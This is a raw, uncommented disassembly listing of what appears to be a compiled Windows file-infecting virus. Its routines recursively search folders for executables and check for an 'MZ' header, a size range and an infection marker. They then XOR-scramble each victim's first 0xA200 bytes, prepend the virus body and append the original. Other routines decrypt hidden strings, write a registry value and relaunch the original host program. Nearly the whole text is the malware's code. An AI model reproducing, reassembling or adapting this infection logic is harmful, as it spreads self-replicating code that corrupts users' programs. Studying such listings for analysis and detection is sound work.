                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                call    sub_4BD8
                fstp    [ebp+var_8]
                wait
                lea     eax, [ebp+var_C]
                call    sub_4408
                lea     eax, [ebp+var_C]
                push    eax
                lea     eax, [ebp+var_10]
                mov     edx, 40919Ch
                mov     ecx, 0Bh
                call    sub_25F4
                mov     edx, [ebp+var_10]
                pop     eax
                call    sub_2614
                mov     eax, [ebp+var_C]
                call    sub_280C
                lea     edx, [ebp+var_8]
                mov     ecx, 8
                call    sub_3FF8
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    406E8Fh

loc_627A:                               ; CODE XREF: CODE:0000628D↓j
                lea     eax, [ebp+var_10]
                mov     edx, 2
                call    sub_24B8
                retn
sub_620C        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_627A
; ---------------------------------------------------------------------------
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_6294        proc near               ; CODE XREF: sub_699C+18↓p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = qword ptr -8

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFF0h
                push    ebx
                xor     eax, eax
                mov     [ebp+var_C], eax
                mov     [ebp+var_10], eax
                xor     eax, eax
                push    ebp
                push    406F22h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     bl, 1
                lea     eax, [ebp+var_C]
                call    sub_4408
                lea     eax, [ebp+var_C]
                push    eax
                lea     eax, [ebp+var_10]
                mov     edx, 40919Ch
                mov     ecx, 0Bh
                call    sub_25F4
                mov     edx, [ebp+var_10]
                pop     eax
                call    sub_2614
                mov     eax, [ebp+var_C]
                call    sub_280C
                lea     edx, [ebp+var_8]
                mov     ecx, 8
                call    sub_4078
                test    eax, eax
                jz      short loc_6307
                call    sub_4BD8
                fsub    [ebp+var_8]
                fcomp   dword ptr ds:406F30h
                fnstsw  ax
                sahf
                setnbe  bl

loc_6307:                               ; CODE XREF: sub_6294+5D↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    406F29h

loc_6314:                               ; CODE XREF: CODE:00006327↓j
                lea     eax, [ebp+var_10]
                mov     edx, 2
                call    sub_24B8
                retn
sub_6294        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6314
; ---------------------------------------------------------------------------
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                dd 40A00000h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_6334        proc near               ; CODE XREF: CODE:00006CE1↓p
                                        ; sub_719C+9B↓p

var_8           = dword ptr -8
var_1           = byte ptr -1

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFF8h
                push    ebx
                push    esi
                push    edi
                xor     ecx, ecx
                mov     [ebp+var_8], ecx
                mov     ebx, edx
                mov     [ebp+var_1], al
                xor     eax, eax
                push    ebp
                push    406FC7h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, ebx
                call    sub_2494
                cmp     [ebp+var_1], 0
                jz      short loc_6369
                mov     esi, 1
                jmp     short loc_636E
; ---------------------------------------------------------------------------

loc_6369:                               ; CODE XREF: sub_6334+2C↑j
                mov     esi, 2

loc_636E:                               ; CODE XREF: sub_6334+33↑j
                mov     edi, esi
                call    sub_3EE8
                mov     esi, eax
                sub     esi, edi
                jl      short loc_63A0
                inc     esi

loc_637C:                               ; CODE XREF: sub_6334+6A↓j
                push    dword ptr [ebx]
                lea     edx, [ebp+var_8]
                mov     eax, edi
                call    sub_3DD0
                push    [ebp+var_8]
                push    406FE0h
                mov     eax, ebx
                mov     edx, 3
                call    sub_26CC
                inc     edi
                dec     esi
                jnz     short loc_637C

loc_63A0:                               ; CODE XREF: sub_6334+45↑j
                mov     eax, [ebx]
                call    sub_260C
                mov     edx, eax
                dec     edx
                mov     eax, ebx
                call    sub_2934
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    406FCEh

loc_63BE:                               ; CODE XREF: CODE:000063CC↓j
                lea     eax, [ebp+var_8]
                call    sub_2494
                retn
sub_6334        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_63BE
; ---------------------------------------------------------------------------
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                dd 0FFFFFFFFh, 1, 20h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_63E4        proc near               ; CODE XREF: sub_65D0+74↓p
                                        ; sub_6FD4+5C↓p ...

var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                xor     ecx, ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ebx
                mov     [ebp+var_8], edx
                mov     [ebp+var_4], eax
                mov     eax, [ebp+var_4]
                call    sub_27FC
                mov     eax, [ebp+var_8]
                call    sub_27FC
                xor     eax, eax
                push    ebp
                push    407064h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     edx, [ebp+var_10]
                mov     eax, [ebp+var_4]
                call    sub_4318
                mov     eax, [ebp+var_10]
                lea     edx, [ebp+var_C]
                call    sub_3B00
                mov     eax, [ebp+var_C]
                push    eax
                lea     eax, [ebp+var_14]
                mov     ecx, [ebp+var_8]
                mov     edx, 40707Ch
                call    sub_2658
                mov     edx, [ebp+var_14]
                pop     eax
                call    sub_2758
                setz    bl
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    40706Bh

loc_6456:                               ; CODE XREF: CODE:00006469↓j
                lea     eax, [ebp+var_14]
                mov     edx, 5
                call    sub_24B8
                retn
sub_63E4        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6456
; ---------------------------------------------------------------------------
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                dd 0FFFFFFFFh, 1, 2Eh

; =============== S U B R O U T I N E =======================================


sub_6480        proc near               ; CODE XREF: sub_65D0+23A↓p
                                        ; sub_699C+34↓p ...
                push    ebx
                push    esi
                mov     esi, eax
                mov     eax, ds:409214h
                mov     [eax], ecx
                mov     ebx, edx
                test    ebx, ebx
                jle     short loc_64A1

loc_6491:                               ; CODE XREF: sub_6480+1F↓j
                mov     eax, 0FFh
                call    sub_1A80
                xor     [esi], al
                inc     esi
                dec     ebx
                jnz     short loc_6491

loc_64A1:                               ; CODE XREF: sub_6480+F↑j
                pop     esi
                pop     ebx
                retn
sub_6480        endp

; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                push    ebp
                push    4070C9h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                inc     dword ptr ds:40A694h
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    4070D0h

loc_64C8:                               ; CODE XREF: CODE:000064CE↓j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_64C8
; ---------------------------------------------------------------------------
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                sub     dword ptr ds:40A694h, 1
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_64DC        proc near               ; CODE XREF: CODE:00007574↓p

var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                push    0
                xor     eax, eax
                push    ebp
                push    407126h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     edx, [ebp+var_4]
                xor     eax, eax
                call    sub_3DD0
                mov     eax, [ebp+var_4]
                call    sub_280C
                mov     edx, 40A698h
                mov     ecx, 0A200h
                call    sub_4078
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    40712Dh

loc_651D:                               ; CODE XREF: CODE:0000652B↓j
                lea     eax, [ebp+var_4]
                call    sub_2494
                retn
sub_64DC        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_651D
; ---------------------------------------------------------------------------
                pop     ecx
                pop     ebp
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_6530        proc near               ; CODE XREF: sub_65D0+12C↓p
                                        ; sub_6FD4+90↓p ...

var_104         = byte ptr -104h
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFEFCh
                push    ebx
                mov     [ebp+var_4], eax
                mov     eax, [ebp+var_4]
                call    sub_27FC
                xor     eax, eax
                push    ebp
                push    4071BFh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     edx, 80000303h
                mov     eax, [ebp+var_4]
                call    sub_3F68
                mov     ebx, eax
                cmp     ebx, 0FFFFFFFFh
                jnz     short loc_656B
                xor     ebx, ebx
                jmp     short loc_65A9
; ---------------------------------------------------------------------------

loc_656B:                               ; CODE XREF: sub_6530+35↑j
                xor     ecx, ecx
                mov     edx, 3E8h
                mov     eax, ebx
                call    sub_3FB4
                lea     edx, [ebp+var_104]
                mov     ecx, 100h
                mov     eax, ebx
                call    sub_3FC4
                mov     eax, ebx
                call    sub_3F90
                lea     edx, [ebp+var_104]
                mov     eax, 40AA80h
                mov     ecx, 100h
                call    sub_3BD0
                mov     ebx, eax

loc_65A9:                               ; CODE XREF: sub_6530+39↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    4071C6h

loc_65B6:                               ; CODE XREF: CODE:000065C4↓j
                lea     eax, [ebp+var_4]
                call    sub_2494
                retn
sub_6530        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_65B6
; ---------------------------------------------------------------------------
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_65D0        proc near               ; CODE XREF: sub_68B4+AC↓p
                                        ; sub_719C+31↓p ...

var_A21C        = dword ptr -0A21Ch
var_A218        = dword ptr -0A218h
var_A214        = dword ptr -0A214h
var_A210        = dword ptr -0A210h
var_A20C        = byte ptr -0A20Ch
var_A20B        = byte ptr -0A20Bh
var_9D3A        = byte ptr -9D3Ah
var_C           = dword ptr -0Ch
var_5           = byte ptr -5
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                push    eax
                mov     eax, 0Ah

loc_65D9:                               ; CODE XREF: sub_65D0+11↓j
                add     esp, 0FFFFF004h
                push    eax
                dec     eax
                jnz     short loc_65D9
                mov     eax, [ebp-4]
                add     esp, 0FFFFFDE8h
                push    ebx
                push    esi
                push    edi
                xor     edx, edx
                mov     [ebp+var_A21C], edx
                mov     [ebp+var_A218], edx
                mov     [ebp+var_A214], edx
                mov     [ebp+var_A210], edx
                mov     [ebp+var_4], eax
                mov     eax, [ebp+var_4]
                call    sub_27FC
                xor     eax, eax
                push    ebp
                push    40748Ch
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     [ebp+var_5], 0
                lea     eax, [ebp+var_A210]
                mov     edx, 4091C0h
                mov     ecx, 3
                call    sub_25F4
                mov     edx, [ebp+var_A210]
                mov     eax, [ebp+var_4]
                call    sub_63E4
                test    al, al
                jz      loc_6866
                lea     edx, [ebp+var_A214]
                mov     eax, [ebp+var_4]
                call    sub_4334
                mov     edx, [ebp+var_A214]
                lea     eax, [ebp+var_4]
                call    sub_252C
                lea     eax, [ebp+var_A218]
                call    sub_4390
                mov     eax, [ebp+var_A218]
                call    sub_280C
                push    eax
                mov     eax, [ebp+var_4]
                call    sub_280C
                mov     ebx, eax
                mov     eax, ebx
                pop     edx
                call    sub_3F38
                test    al, al
                jnz     loc_6866
                lea     eax, [ebp+var_A21C]
                call    sub_4408
                mov     eax, [ebp+var_A21C]
                call    sub_280C
                push    eax
                mov     eax, ebx
                pop     edx
                call    sub_3F38
                test    al, al
                jnz     loc_6866
                mov     edx, [ebp+var_4]
                mov     eax, 4074A8h
                call    sub_28EC
                cmp     eax, 3
                jz      loc_6866
                mov     eax, [ebp+var_4]
                call    sub_436C
                cmp     eax, 0A200h
                jbe     loc_6866
                cmp     eax, 989680h
                ja      loc_6866
                mov     eax, [ebp+var_4]
                call    sub_6530
                test    al, al
                jnz     loc_6866
                mov     [ebp+var_5], 1
                mov     eax, [ebp+var_4]
                call    sub_280C
                mov     ebx, eax
                push    ebx
                call    sub_3470
                mov     edi, eax
                test    edi, 1
                jbe     short loc_672F
                push    0
                push    ebx
                call    sub_34D8

loc_672F:                               ; CODE XREF: sub_65D0+155↑j
                call    sub_4FDC
                mov     ebx, eax
                call    sub_58CC
                mov     esi, eax
                mov     eax, esi
                xor     ecx, ecx
                mov     edx, [ebp+var_4]
                call    sub_60A8
                mov     eax, esi
                mov     edx, ebx
                call    sub_5910
                mov     edx, 16h
                mov     eax, ebx
                call    sub_4D74
                mov     eax, 4135E8h
                mov     edx, 10A8h
                call    sub_3598
                mov     edx, 4135E8h
                mov     ecx, 10A8h
                mov     eax, ebx
                call    sub_4D88
                mov     eax, ebx
                call    sub_3920
                mov     eax, esi
                call    sub_3920
                mov     edx, 0C0000303h
                mov     eax, [ebp+var_4]
                call    sub_3F68
                mov     ebx, eax
                cmp     ebx, 0FFFFFFFFh
                jz      loc_6848
                lea     edx, [ebp+var_A20C]
                mov     ecx, 2
                mov     eax, ebx
                call    sub_3FC4
                cmp     [ebp+var_A20C], 4Dh ; 'M'
                jnz     loc_6848
                cmp     [ebp+var_A20B], 5Ah ; 'Z'
                jnz     short loc_6848
                xor     ecx, ecx
                xor     edx, edx
                mov     eax, ebx
                call    sub_3FB4
                lea     edx, [ebp+var_A20C]
                mov     ecx, 0A200h
                mov     eax, ebx
                call    sub_3FC4
                lea     edx, [ebp+var_C]
                lea     eax, [ebp+var_9D3A]
                mov     ecx, 4
                call    sub_194C
                lea     eax, [ebp+var_A20C]
                mov     ecx, [ebp+var_C]
                mov     edx, 3E8h
                call    sub_6480
                xor     ecx, ecx
                xor     edx, edx
                mov     eax, ebx
                call    sub_3FB4
                mov     edx, 40A698h
                mov     ecx, 0A200h
                mov     eax, ebx
                call    sub_3FE0
                mov     cl, 2
                xor     edx, edx
                mov     eax, ebx
                call    sub_3FB4
                lea     edx, [ebp+var_A20C]
                mov     ecx, 0A200h
                mov     eax, ebx
                call    sub_3FE0

loc_6848:                               ; CODE XREF: sub_65D0+1CE↑j
                                        ; sub_65D0+1ED↑j ...
                mov     eax, ebx
                call    sub_3F90
                test    edi, 1
                jbe     short loc_6866
                push    edi
                mov     eax, [ebp+var_4]
                call    sub_280C
                push    eax
                call    sub_34D8

loc_6866:                               ; CODE XREF: sub_65D0+7B↑j
                                        ; sub_65D0+C8↑j ...
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407493h

loc_6873:                               ; CODE XREF: CODE:00006891↓j
                lea     eax, [ebp+var_A21C]
                mov     edx, 4
                call    sub_24B8
                lea     eax, [ebp+var_4]
                call    sub_2494
                retn
sub_65D0        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6873
; ---------------------------------------------------------------------------
                mov     al, [ebp-5]
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h
                dd 0FFFFFFFFh, 0Ah, 4F52505Ch, 7E415247h, 5C31h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_68B4        proc near               ; CODE XREF: sub_68B4+87↓p
                                        ; sub_699C+90↓p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                xor     ecx, ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ebx
                push    esi
                push    edi
                mov     [ebp+var_4], eax
                mov     eax, [ebp+var_4]
                call    sub_27FC
                xor     eax, eax
                push    ebp
                push    40758Bh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     eax, [ebp+var_8]
                mov     edx, 4091DCh
                mov     ecx, 3
                call    sub_25F4
                mov     edx, [ebp+var_8]
                xor     ecx, ecx
                mov     eax, [ebp+var_4]
                call    sub_46AC
                mov     ebx, eax
                mov     eax, ebx
                call    sub_472C
                mov     edi, eax
                dec     edi
                test    edi, edi
                jl      short loc_6969
                inc     edi
                xor     esi, esi

loc_690D:                               ; CODE XREF: sub_68B4+B3↓j
                mov     edx, esi
                mov     eax, ebx
                call    sub_474C
                test    al, al
                jz      short loc_6943
                mov     eax, [ebp+arg_0]
                push    eax
                lea     ecx, [ebp+var_10]
                mov     edx, esi
                mov     eax, ebx
                call    sub_4738
                mov     ecx, [ebp+var_10]
                lea     eax, [ebp+var_C]
                mov     edx, [ebx+1Ch]
                call    sub_2658
                mov     eax, [ebp+var_C]
                call    sub_68B4
                pop     ecx
                jmp     short loc_6965
; ---------------------------------------------------------------------------

loc_6943:                               ; CODE XREF: sub_68B4+64↑j
                lea     ecx, [ebp+var_18]
                mov     edx, esi
                mov     eax, ebx
                call    sub_4738
                mov     ecx, [ebp+var_18]
                lea     eax, [ebp+var_14]
                mov     edx, [ebx+1Ch]
                call    sub_2658
                mov     eax, [ebp+var_14]
                call    sub_65D0

loc_6965:                               ; CODE XREF: sub_68B4+8D↑j
                inc     esi
                dec     edi
                jnz     short loc_690D

loc_6969:                               ; CODE XREF: sub_68B4+54↑j
                mov     eax, ebx
                call    sub_3920
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407592h

loc_697D:                               ; CODE XREF: CODE:00006990↓j
                lea     eax, [ebp+var_18]
                mov     edx, 6
                call    sub_24B8
                retn
sub_68B4        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_697D
; ---------------------------------------------------------------------------
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_699C        proc near               ; CODE XREF: CODE:00007600↓p

var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                push    0
                push    0
                push    ebx
                push    esi
                push    edi
                xor     eax, eax
                push    ebp
                push    40765Ch
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                call    sub_6294
                test    al, al
                jz      loc_6A41
                mov     eax, 4091C8h
                mov     ecx, 14h
                mov     edx, 14h
                call    sub_6480
                push    4091C8h
                push    0
                push    0
                call    sub_3418
                mov     edi, eax
                call    sub_3480
                cmp     eax, 0B7h
                jz      short loc_6A41
                lea     eax, [ebp+var_4]
                call    sub_6140
                mov     eax, [ebp+var_4]
                call    sub_260C
                mov     ebx, eax
                test    ebx, ebx
                jle     short loc_6A36
                mov     esi, 1

loc_6A0C:                               ; CODE XREF: sub_699C+98↓j
                push    ebp
                lea     eax, [ebp+var_8]
                mov     edx, [ebp+var_4]
                mov     dl, [edx+esi-1]
                call    sub_25B4
                lea     eax, [ebp+var_8]
                mov     edx, 407674h
                call    sub_2614
                mov     eax, [ebp+var_8]
                call    sub_68B4
                pop     ecx
                inc     esi
                dec     ebx
                jnz     short loc_6A0C

loc_6A36:                               ; CODE XREF: sub_699C+69↑j
                call    sub_620C
                push    edi
                call    sub_34C0

loc_6A41:                               ; CODE XREF: sub_699C+1F↑j
                                        ; sub_699C+53↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407663h

loc_6A4E:                               ; CODE XREF: CODE:00006A61↓j
                lea     eax, [ebp+var_8]
                mov     edx, 2
                call    sub_24B8
                retn
sub_699C        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6A4E
; ---------------------------------------------------------------------------
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
                dd 0FFFFFFFFh, 2, 5C3Ah

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_6A78        proc near               ; CODE XREF: CODE:00007592↓p

var_A23C        = dword ptr -0A23Ch
var_A238        = dword ptr -0A238h
var_A234        = dword ptr -0A234h
var_A230        = dword ptr -0A230h
var_A22C        = dword ptr -0A22Ch
var_A228        = dword ptr -0A228h
var_A224        = dword ptr -0A224h
var_A220        = dword ptr -0A220h
var_A21C        = dword ptr -0A21Ch
var_A218        = dword ptr -0A218h
var_A214        = dword ptr -0A214h
var_A210        = dword ptr -0A210h
var_A20C        = byte ptr -0A20Ch
var_9D3A        = byte ptr -9D3Ah
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                mov     ecx, 144Bh

loc_6A80:                               ; CODE XREF: sub_6A78+D↓j
                push    0
                push    0
                dec     ecx
                jnz     short loc_6A80
                push    ecx
                xor     eax, eax
                push    ebp
                push    40798Ch
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     eax, [ebp+var_A210]
                call    sub_4408
                lea     eax, [ebp+var_A210]
                push    eax
                lea     eax, [ebp+var_A214]
                mov     edx, 4091B4h
                mov     ecx, 9
                call    sub_25F4
                mov     edx, [ebp+var_A214]
                pop     eax
                call    sub_2614
                mov     eax, [ebp+var_A210]
                call    sub_41E0
                lea     eax, [ebp+var_A21C]
                call    sub_4408
                push    [ebp+var_A21C]
                lea     eax, [ebp+var_A220]
                mov     edx, 4091B4h
                mov     ecx, 9
                call    sub_25F4
                push    [ebp+var_A220]
                lea     eax, [ebp+var_A224]
                mov     edx, 4091DCh
                mov     ecx, 3
                call    sub_25F4
                push    [ebp+var_A224]
                lea     eax, [ebp+var_A218]
                mov     edx, 3
                call    sub_26CC
                mov     eax, [ebp+var_A218]
                call    sub_4600
                lea     edx, [ebp+var_A228]
                xor     eax, eax
                call    sub_3DD0
                mov     eax, [ebp+var_A228]
                call    sub_4F60
                mov     [ebp+var_4], eax
                xor     eax, eax
                push    ebp
                push    40789Fh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     eax, [ebp+var_A230]
                call    sub_4408
                push    [ebp+var_A230]
                lea     eax, [ebp+var_A234]
                mov     edx, 4091B4h
                mov     ecx, 9
                call    sub_25F4
                push    [ebp+var_A234]
                lea     edx, [ebp+var_A23C]
                xor     eax, eax
                call    sub_3DD0
                mov     eax, [ebp+var_A23C]
                lea     edx, [ebp+var_A238]
                call    sub_42D0
                push    [ebp+var_A238]
                lea     eax, [ebp+var_A22C]
                mov     edx, 3
                call    sub_26CC
                mov     eax, [ebp+var_A22C]
                mov     edx, 40000103h
                call    sub_4F24
                mov     [ebp+var_8], eax
                xor     eax, eax
                push    ebp
                push    407882h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, [ebp+var_4]
                call    sub_4D7C
                mov     edx, eax
                sub     edx, 0A200h
                mov     eax, [ebp+var_4]
                call    sub_4D74
                lea     edx, [ebp+var_A20C]
                mov     eax, [ebp+var_4]
                mov     ecx, 0A200h
                call    sub_4D88
                lea     edx, [ebp+var_C]
                lea     eax, [ebp+var_9D3A]
                mov     ecx, 4
                call    sub_194C
                lea     eax, [ebp+var_A20C]
                mov     ecx, [ebp+var_C]
                mov     edx, 3E8h
                call    sub_6480
                lea     edx, [ebp+var_A20C]
                mov     eax, [ebp+var_8]
                mov     ecx, 0A200h
                call    sub_4D8C
                mov     eax, [ebp+var_4]
                mov     edx, 0A200h
                call    sub_4D74
                mov     eax, [ebp+var_4]
                call    sub_4D7C
                mov     ecx, eax
                sub     ecx, offset byte_14400
                mov     edx, [ebp+var_4]
                mov     eax, [ebp+var_8]
                call    sub_4FE8
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407889h

loc_6C79:                               ; CODE XREF: CODE:00006C87↓j
                mov     eax, [ebp+var_8]
                call    sub_3920
                retn
sub_6A78        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6C79
; ---------------------------------------------------------------------------
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    4078A6h

loc_6C96:                               ; CODE XREF: CODE:00006CA4↓j
                mov     eax, [ebp-4]
                call    sub_3920
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6C96
; ---------------------------------------------------------------------------
                lea     edx, [ebp-0A244h]
                xor     eax, eax
                call    sub_3DD0
                mov     eax, [ebp-0A244h]
                lea     edx, [ebp-0A240h]
                call    sub_42EC
                mov     eax, [ebp-0A240h]
                call    sub_280C
                push    eax
                call    sub_34C8
                push    1
                push    0
                lea     edx, [ebp-0A248h]
                mov     al, 1
                call    sub_6334
                mov     eax, [ebp-0A248h]
                call    sub_280C
                push    eax
                lea     eax, [ebp-0A250h]
                call    sub_4408
                push    dword ptr [ebp-0A250h]
                lea     eax, [ebp-0A254h]
                mov     edx, 4091B4h
                mov     ecx, 9
                call    sub_25F4
                push    dword ptr [ebp-0A254h]
                lea     edx, [ebp-0A25Ch]
                xor     eax, eax
                call    sub_3DD0
                mov     eax, [ebp-0A25Ch]
                lea     edx, [ebp-0A258h]
                call    sub_42D0
                push    dword ptr [ebp-0A258h]
                lea     eax, [ebp-0A24Ch]
                mov     edx, 3
                call    sub_26CC
                mov     eax, [ebp-0A24Ch]
                call    sub_280C
                push    eax
                push    407998h
                mov     eax, ds:40A650h
                push    eax
                call    sub_3650
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407993h

loc_6D7B:                               ; CODE XREF: CODE:00006D91↓j
                lea     eax, [ebp-0A25Ch]
                mov     edx, 14h
                call    sub_24B8
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6D7B
; ---------------------------------------------------------------------------
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4
aOpen           db 'open',0
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_6DA0        proc near               ; CODE XREF: CODE:loc_75FB↓p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                xor     ecx, ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ebx
                xor     eax, eax
                push    ebp
                push    407AC4h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, 4091E0h
                mov     ecx, 0Bh
                mov     edx, 0Bh
                call    sub_6480
                lea     eax, [ebp+var_8]
                mov     edx, 4091E0h
                mov     ecx, 0Bh
                call    sub_25F4
                mov     eax, [ebp+var_8]
                push    eax
                lea     eax, [ebp+var_C]
                call    sub_4390
                mov     edx, [ebp+var_C]
                lea     eax, [ebp+var_4]
                pop     ecx
                call    sub_2658
                mov     eax, [ebp+var_4]
                call    sub_3F9C
                test    al, al
                jz      short loc_6E12
                mov     eax, [ebp+var_4]
                call    sub_280C
                push    eax
                call    sub_3438

loc_6E12:                               ; CODE XREF: sub_6DA0+62↑j
                mov     eax, [ebp+var_4]
                call    sub_280C
                mov     edx, 40A698h
                mov     ecx, 0A200h
                call    sub_3FF8
                test    eax, eax
                jz      short loc_6EA9
                mov     eax, 4091ECh
                mov     ecx, 1Ah
                mov     edx, 1Ah
                call    sub_6480
                lea     eax, [ebp+var_10]
                mov     edx, 4091ECh
                mov     ecx, 1Ah
                call    sub_25F4
                mov     edx, [ebp+var_10]
                mov     eax, 80000000h
                call    sub_4B5C
                mov     ebx, eax
                mov     eax, 409208h
                mov     ecx, 8
                mov     edx, 8
                call    sub_6480
                lea     eax, [ebp+var_18]
                mov     edx, 409208h
                mov     ecx, 8
                call    sub_25F4
                mov     ecx, [ebp+var_18]
                lea     eax, [ebp+var_14]
                mov     edx, [ebp+var_4]
                call    sub_2658
                mov     ecx, [ebp+var_14]
                xor     edx, edx
                mov     eax, ebx
                call    sub_4B8C
                mov     eax, ebx
                call    sub_4BCC

loc_6EA9:                               ; CODE XREF: sub_6DA0+8B↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    407ACBh

loc_6EB6:                               ; CODE XREF: CODE:00006EC9↓j
                lea     eax, [ebp+var_18]
                mov     edx, 6
                call    sub_24B8
                retn
sub_6DA0        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_6EB6
; ---------------------------------------------------------------------------
